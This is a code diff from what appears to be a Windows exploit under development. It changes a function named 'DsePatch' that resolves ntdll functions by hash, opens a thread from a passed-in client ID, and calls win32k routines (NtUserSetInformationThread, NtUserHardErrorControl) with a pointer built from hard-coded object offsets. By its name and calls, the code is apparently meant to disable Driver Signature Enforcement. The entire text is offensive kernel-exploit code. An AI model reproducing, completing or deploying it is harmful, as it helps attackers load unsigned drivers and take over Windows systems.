@@ -34,17 +34,18 @@ D_SEC( C ) VOID WINAPI DsePatch( PVOID Parameter )
 	PSYSTEM_HANDLE_INFORMATION	Sys = NULL;
 
 	API				Api;
+	CLIENT_ID			Cid;
+	LARGE_INTEGER			Prm;
 	OBJECT_ATTRIBUTES		Obj;
-	DESKTOPRESTOREDATA		Des;
 	USERTHREAD_USEDESKTOP		Usr;
 
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
+	RtlSecureZeroMemory( &Prm, sizeof( Prm ) );
 	RtlSecureZeroMemory( &Obj, sizeof( Obj ) );
-	RtlSecureZeroMemory( &Des, sizeof( Des ) );
+	RtlSecureZeroMemory( &Usr, sizeof( Usr ) );
 
 	Api.NtQuerySystemInformation = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYSYSTEMINFORMATION );
-	Api.RtlCreateUserThread      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEUSERTHREAD );
-	Api.NtWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
 	Api.RtlReAllocateHeap        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
 	Api.NtQueueApcThread         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUEUEAPCTHREAD );
 	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
@@ -54,8 +55,11 @@ D_SEC( C ) VOID WINAPI DsePatch( PVOID Parameter )
 	Api.DbgPrint		     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_DBGPRINT );
 	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
 
-	Obj.Length = sizeof( OBJECT_ATTRIBUTES );
-	if ( ! Api.NtOpenThread( &Thd, THREAD_ALL_ACCESS, &Obj, &NtCurrentTeb()->ClientId ) ) {
+	Obj.Length        = sizeof( OBJECT_ATTRIBUTES );
+	Cid.UniqueThread  = ( ( PCLIENT_ID ) Parameter )->UniqueThread;
+	Cid.UniqueProcess = ( ( PCLIENT_ID ) Parameter )->UniqueProcess;
+
+	if ( ! Api.NtOpenThread( &Thd, THREAD_ALL_ACCESS, &Obj, &Cid ) ) {
 		/* Create the initial allocation */
 		Mgr = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
 		Sys = Api.RtlAllocateHeap( Mgr, HEAP_ZERO_MEMORY, Len );
@@ -86,12 +90,9 @@ D_SEC( C ) VOID WINAPI DsePatch( PVOID Parameter )
 
 			/* Good! */
 			if ( Obf != NULL ) {
-				Usr.hThread              = NULL;
-				Usr.Restore.pDeskRestore = NULL;
-				Usr.Restore.pDeskNew     = NULL;
-
 				if ( ! NtUserSetInformationThread( ( ( HANDLE ) - 2 ), 7, &Usr, sizeof( Usr ) ) ) {
-
+					Usr.Restore.pDeskRestore = C_PTR( U_PTR( U_PTR( U_PTR( Obf ) + 0x232 ) + 0x30 ) );
+					NtUserHardErrorControl( 6, ( ( HANDLE ) - 2 ), &Usr.Restore );
 				};
 			};
 			Api.RtlFreeHeap( Mgr, 0, Sys );
